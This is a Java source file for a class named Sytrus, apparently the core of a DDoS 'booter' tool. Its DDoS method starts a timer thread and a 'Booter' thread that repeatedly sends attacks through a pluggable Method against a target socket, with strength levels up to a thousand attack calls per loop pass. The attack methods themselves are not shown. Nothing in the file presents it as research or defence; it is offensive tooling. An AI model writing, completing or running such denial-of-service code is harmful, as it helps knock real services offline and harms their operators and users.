package com.sytrus.api;

import java.io.IOException;
import java.net.Socket;

public class Sytrus {

	private Socket socket;
	private boolean inAttack;
	private int seconds;
	private Strength strength;
	private int timeLeft;
	private Method method;
	private SytrusBase base;
	
	public Sytrus(Socket socket, SytrusBase base) {
		this.base = base;
		this.socket = socket;
	}
	
	public void log(String str) {
		System.out.println(str);
	}
	
	public void DDoS(int seconds, Method method, Strength strength) {
		if(inAttack) {
			log("Attack in progress");
			return;
		}else {
			this.inAttack = true;
			this.seconds = seconds;
			this.strength = strength;
			this.timeLeft = seconds;
			this.method = method;
			thread.start();
			booter.start();
		}
	}
	
	Thread thread = new Thread("Timer") {
		
		@Override
		public void run() {
			for(int i = 0; i < seconds; i++) {
				try {
					Thread.sleep(1000);
					timeLeft = seconds - (i + 1);
					System.out.println(getTimeLeft());
				} catch (InterruptedException e) {
					log("Error in thread sleep");
				}
			}
			booter.stop();
			inAttack = false;
			try {
				socket.close();
			} catch (IOException e) {
			}
		}
		
	};
	
	Thread booter = new Thread("Booter") {
		
		@Override
		public void run() {
			while(inAttack) {
				if(strength == Strength.WEAKEST) {
					attack();
				}else
					if(strength == Strength.WEAK) {
						for(int i = 0; i < 10; i++) {
							attack();
						}
					}else
						if(strength == Strength.STANDARD) {
							for(int i = 0; i < 50; i++) {
								attack();
							}
						}else
							if(strength == Strength.STRONG) {
								for(int i = 0; i < 100; i++) {
									attack();
								}
							}else
								if(strength == Strength.STRONGEST) {
									for(int i = 0; i < 100; i++) {
										for(int c = 0; c < 10; c++){
											attack();
										}
									}
								}
					
			}
			
		}
		
	};

	public void done() {
		base.done();
	}
	
	public int getTimeLeft() {
		return timeLeft;
	}
	
	public void attack() {
		method.attack(socket);
	}
	
	public boolean inAttack() {
		return inAttack;
	}
	
}
